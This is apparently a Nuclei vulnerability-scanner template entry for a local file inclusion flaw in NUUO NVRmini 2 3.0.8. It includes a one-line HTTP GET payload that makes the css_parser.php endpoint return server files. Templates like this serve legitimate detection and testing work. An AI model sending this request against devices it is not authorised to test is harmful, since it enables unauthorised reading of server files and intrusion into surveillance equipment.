# Nuclei Template: NUUO NVRmini 2 3.0.8 - Local File Inclusion
**Template ID:** nuuo-file-inclusion
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`nuuo-file-inclusion.yaml`)

## Vulnerability Information & PoC

## Description
NUUO NVRmini 2 3.0.8 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/css_parser.php?css=css_parser.php
```

## References
- https://www.exploit-db.com/exploits/40211
